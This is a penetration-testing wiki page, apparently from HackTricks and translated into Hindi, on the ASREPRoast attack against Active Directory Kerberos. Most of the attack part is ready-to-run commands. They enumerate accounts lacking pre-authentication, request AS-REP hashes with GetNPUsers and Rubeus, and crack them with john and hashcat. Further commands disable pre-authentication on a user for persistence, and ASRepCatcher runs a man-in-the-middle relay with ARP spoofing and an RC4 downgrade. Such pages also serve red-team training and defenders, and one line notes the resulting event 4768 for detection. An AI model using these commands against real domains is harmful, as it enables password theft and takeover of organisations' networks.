# ASREPRoast

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## ASREPRoast

ASREPRoast एक सुरक्षा हमला है जो उन उपयोगकर्ताओं का लाभ उठाता है जिनमें **Kerberos पूर्व-प्रमाणीकरण आवश्यक विशेषता** नहीं होती है। मूल रूप से, यह भेद्यता हमलावरों को उपयोगकर्ता के लिए डोमेन कंट्रोलर (DC) से प्रमाणीकरण का अनुरोध करने की अनुमति देती है बिना उपयोगकर्ता के पासवर्ड की आवश्यकता के। फिर DC उपयोगकर्ता के पासवर्ड-व्युत्पन्न कुंजी के साथ एन्क्रिप्टेड संदेश के साथ प्रतिक्रिया करता है, जिसे हमलावर ऑफ़लाइन क्रैक करने का प्रयास कर सकते हैं ताकि उपयोगकर्ता का पासवर्ड पता चल सके।

इस हमले की मुख्य आवश्यकताएँ हैं:

* **Kerberos पूर्व-प्रमाणीकरण की कमी**: लक्षित उपयोगकर्ताओं में यह सुरक्षा विशेषता सक्षम नहीं होनी चाहिए।
* **डोमेन कंट्रोलर (DC) से कनेक्शन**: हमलावरों को अनुरोध भेजने और एन्क्रिप्टेड संदेश प्राप्त करने के लिए DC तक पहुंच की आवश्यकता होती है।
* **वैकल्पिक डोमेन खाता**: डोमेन खाता होने से हमलावरों को LDAP क्वेरी के माध्यम से कमजोर उपयोगकर्ताओं की पहचान करने में अधिक कुशलता मिलती है। बिना ऐसे खाते के, हमलावरों को उपयोगकर्ता नामों का अनुमान लगाना होगा।

#### कमजोर उपयोगकर्ताओं की गणना करना (डोमेन क्रेडेंशियल की आवश्यकता)

{% code title="Using Windows" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% endcode %}

{% code title="Linux का उपयोग करना" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
{% endcode %}

#### AS\_REP संदेश का अनुरोध करें

{% code title="Linux का उपयोग करते हुए" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Windows का उपयोग करना" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
AS-REP रोस्टिंग Rubeus के साथ 4768 उत्पन्न करेगा जिसमें एन्क्रिप्शन प्रकार 0x17 और प्रीऑथ प्रकार 0 होगा।
{% endhint %}

### क्रैकिंग
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistence

एक उपयोगकर्ता के लिए **preauth** को मजबूर करें जहाँ आपके पास **GenericAll** अनुमतियाँ (या गुण लिखने की अनुमतियाँ) हैं:

{% code title="Using Windows" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endcode %}

{% code title="Linux का उपयोग करना" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
{% endcode %}

## ASREProast बिना क्रेडेंशियल्स

एक हमलावर मैन-इन-द-मिडल स्थिति का उपयोग करके AS-REP पैकेट्स को नेटवर्क के माध्यम से कैप्चर कर सकता है बिना यह निर्भर किए कि Kerberos प्री-ऑथेंटिकेशन बंद है या नहीं। इसलिए, यह VLAN पर सभी उपयोगकर्ताओं के लिए काम करता है।\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) हमें ऐसा करने की अनुमति देता है। इसके अलावा, यह उपकरण क्लाइंट वर्कस्टेशनों को Kerberos बातचीत को बदलकर RC4 का उपयोग करने के लिए मजबूर करता है।
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## संदर्भ

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

अनुभवी हैकरों और बग बाउंटी शिकारियों के साथ संवाद करने के लिए [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) सर्वर में शामिल हों!

**हैकिंग अंतर्दृष्टि**\
हैकिंग के रोमांच और चुनौतियों में गहराई से जाने वाली सामग्री के साथ संलग्न हों

**वास्तविक समय हैक समाचार**\
वास्तविक समय समाचार और अंतर्दृष्टियों के माध्यम से तेज़-तर्रार हैकिंग दुनिया के साथ अद्यतित रहें

**नवीनतम घोषणाएँ**\
नवीनतम बग बाउंटी लॉन्च और महत्वपूर्ण प्लेटफ़ॉर्म अपडेट के साथ सूचित रहें

**आज ही शीर्ष हैकरों के साथ सहयोग शुरू करने के लिए** [**Discord**](https://discord.com/invite/N3FrSbmwdy) में शामिल हों!

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* **💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **Twitter** 🐦 पर हमें **फॉलो** करें [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।

</details>
{% endhint %}
